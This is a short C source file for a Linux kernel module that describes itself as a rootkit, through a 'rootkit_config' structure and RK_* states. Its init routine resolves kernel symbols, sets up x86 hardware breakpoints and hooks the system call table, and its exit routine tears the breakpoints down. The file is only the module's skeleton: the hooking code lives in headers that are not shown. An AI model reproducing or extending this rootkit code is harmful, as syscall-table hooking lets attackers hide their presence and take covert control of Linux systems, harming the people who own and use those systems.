#include <linux/kernel.h>
#include <linux/module.h>

#include <ylsm/config.h>
#include <ylsm/debug.h>
#include <ylsm/hooks.h>
#include <ylsm/ksyms.h>
#include <ylsm/x86.h>

MODULE_LICENSE("GPL");

struct rootkit_config rk_cfg = {
	.state = RK_BOOT,
	.dr_protect = 0,
	.patch_debug = 1,
};

static int __init ylsm_init(void)
{
	int ret;

	/* MUST be called first */
	ret = get_kernel_syms();
	if (ret)
		return 1;

	debug("init");

	/* architecture specific */
	ret = x86_hw_breakpoint_init();
	if (ret)
		return 1;

	hook_sys_call_table();

	rk_cfg.state = RK_ACTIVE;

	return 0;
}

static void __exit ylsm_exit(void)
{
	rk_cfg.state = RK_SHUTDOWN;

	debug("exit");

	/* architecture specific */
	x86_hw_breakpoint_exit();

}

module_init(ylsm_init);
module_exit(ylsm_exit);
